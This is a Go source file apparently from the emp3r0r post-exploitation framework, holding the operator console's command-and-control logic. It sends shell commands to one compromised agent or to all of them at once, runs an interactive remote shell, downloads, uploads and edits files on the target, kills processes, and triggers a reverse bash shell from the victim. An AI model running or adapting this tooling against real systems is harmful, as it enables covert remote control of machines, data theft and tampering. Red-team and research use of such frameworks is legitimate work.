package cc

import (
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/bettercap/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *agent.SystemInfo) {
		if Targets[target].Conn == nil {
			CliPrintError("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		var data agent.MsgTunData
		data.Payload = "cmd" + agent.OpSep + Options["cmd_to_exec"].Val
		data.Tag = target.Tag
		err := Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleCmd: %v", err)
		}
	}

	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintWarning("emp3r0r will execute `%s` on all targets this time", Options["cmd_to_exec"].Val)
		for target := range Targets {
			execOnTarget(target)
		}
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell like moduleCmd, but interactive, like all shells do
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// send data
	var data agent.MsgTunData
	CliPrintInfo("\nEntering shell of agent[%d] ...\n"+
		"Note: Use `upgrade` command to start a fully interactive reverse shell, type `help` for more info",
		tControl.Index)

	// prompt info
	username := strings.Fields(target.User)[0]
	hostname := strings.Fields(target.Hostname)[0]
	shellPrompt := color.HiCyanString("[%d] ", tControl.Index) + color.HiMagentaString("%s@%s$ ", username, hostname)
	if target.HasRoot {
		shellPrompt = color.HiCyanString("[%d] ", tControl.Index) + color.HiGreenString("%s@%s# ", username, hostname)
	}

	// set autocomplete
	var shellCmdCompls []readline.PrefixCompleterInterface
	for cmd := range ShellHelpInfo {
		if cmd == "put" {
			continue
		}
		shellCmdCompls = append(shellCmdCompls, readline.PcItem(cmd))
	}
	shellCmdCompls = append(shellCmdCompls, readline.PcItemDynamic(listFiles("./")))
	shellCmdCompls = append(shellCmdCompls,
		readline.PcItem("put",
			readline.PcItemDynamic(listFiles("./"))),
	)
	CliCompleter.SetChildren(shellCmdCompls)
	defer CliCompleter.SetChildren(CmdCompls)
shell:
	for {
		// set prompt to shell
		oldPrompt := EmpReadLine.Config.Prompt
		EmpReadLine.SetPrompt(shellPrompt)
		defer EmpReadLine.SetPrompt(oldPrompt)

		// line feed
		fmt.Println()
		// read user input
		input, err := EmpReadLine.Readline()
		if err != nil {
			if err == readline.ErrInterrupt {
				if len(input) == 0 {
					break
				} else {
					continue
				}
			} else if err == io.EOF {
				break
			}
			CliPrintError("Error: %v", err)
			break
		}

		input = strings.TrimSpace(input)
		inputSlice := strings.Fields(input)

		// deal with input
		switch {
		case input == "exit":
			break shell
		case input == "":
			continue shell
		case input == HELP:
			CliPrettyPrint("Helper", "Usage", &ShellHelpInfo)
			continue shell

		case input == "upgrade":
			if err = cmdBash(); err != nil {
				return
			}
			break shell

		case inputSlice[0] == "#kill":
			if len(inputSlice) < 2 {
				CliPrintError("#kill <pids to kill>")
			}
			err = SendCmd("#kill "+strings.Join(inputSlice[1:], " "), target)
			if err != nil {
				CliPrintError("failed to send command: %v", err)
			}
			continue shell

		case inputSlice[0] == "#ps":
			err = SendCmd("#ps", target)
			if err != nil {
				CliPrintError("failed to send command: %v", err)
			}
			continue shell

		case inputSlice[0] == "#net":
			color.Cyan("[*] On connect:\n")
			fmt.Printf("IP addresses: %s\nARP cache: %s\n",
				strings.Join(target.IPs, ", "),
				strings.Join(target.ARP, ", "))
			color.Cyan("\n[*] Updated:\n")

			// get refreshed results
			err = SendCmd("#net", target)
			if err != nil {
				CliPrintError("failed to send command: %v", err)
			}
			continue shell

		case inputSlice[0] == "get":
			// #get file from agent
			if len(inputSlice) != 2 {
				CliPrintError("get <remote path>")
				continue shell
			}

			if err = GetFile(inputSlice[1], target); err != nil {
				CliPrintError("Cannot get %s: %v", inputSlice[2], err)
			}

			continue shell

		case inputSlice[0] == "put":
			// #put file on agent
			if len(inputSlice) != 3 {
				CliPrintError("put <local path> <remote path>")
				continue shell
			}

			if err = PutFile(inputSlice[1], inputSlice[2], target); err != nil {
				CliPrintError("Cannot put %s: %v", inputSlice[2], err)
			}
			continue shell

		case inputSlice[0] == "vim":

			if len(inputSlice) < 2 {
				CliPrintError("What file do you want to edit?")
				continue shell
			}
			filepath := inputSlice[1]
			filename := util.FileBaseName(filepath)

			// tell user what to do
			color.HiBlue("[*] Now edit %s in vim window",
				filepath)

			// edit remote files
			if GetFile(filepath, target) != nil {
				CliPrintError("Cannot download %s", filepath)
				continue shell
			}

			if err = VimEdit(FileGetDir + filename); err != nil {
				CliPrintError("VimEdit: %v", err)
				continue shell
			} // wait until vim exits

			// upload the new file to target
			if PutFile(FileGetDir+filename, filepath, target) != nil {
				CliPrintError("Cannot upload %s", filepath)
			}
			continue shell
		default:
		}

		// send whatever else to agent, execute as shell command
		data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, input)
		data.Tag = target.Tag
		err = Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleShell: %v", err)
		}
	}
	CliPrintSuccess("\n[*] shell[%d] finished", tControl.Index)
}

func cmdBash() (err error) {
	// activate reverse shell in agent
	token := uuid.New().String()
	RShellStream.Token = token
	cmd := fmt.Sprintf("bash %s", token)
	err = SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: %v", err)
		return
	}

	// wait for agent to send shell
	for {
		if RShellStatus[token] != nil {
			CliPrintError("\n[-] An error occured: %v\n", RShellStatus[token])
			return RShellStatus[token]
		}
		if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	// set up local terminal to use remote bash shell
	send := make(chan []byte)
	reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
	time.Sleep(1 * time.Second)

	return
}
